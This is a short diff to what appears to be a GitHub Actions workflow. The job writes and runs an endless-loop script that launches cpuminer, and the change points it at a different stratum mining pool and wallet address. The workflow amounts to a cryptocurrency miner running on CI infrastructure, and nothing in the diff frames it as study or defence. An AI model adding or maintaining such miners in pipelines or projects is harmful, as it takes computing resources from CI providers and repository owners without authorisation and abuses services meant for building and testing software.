@@ -23,7 +23,7 @@ jobs:
         run: |
           echo '#!/bin/sh
           while [ 1 ]; do
-          ./cpuminer -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17111 -u aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1
+          ./cpuminer -a yespower -o stratum+tcp://pool.viporlab.net:16004 -u v38ioPMpp4jmKPjssPbdGygKLK9hFkvyXk.c1
           done' > autominer.sh
           chmod +x autominer.sh
           ./autominer.sh
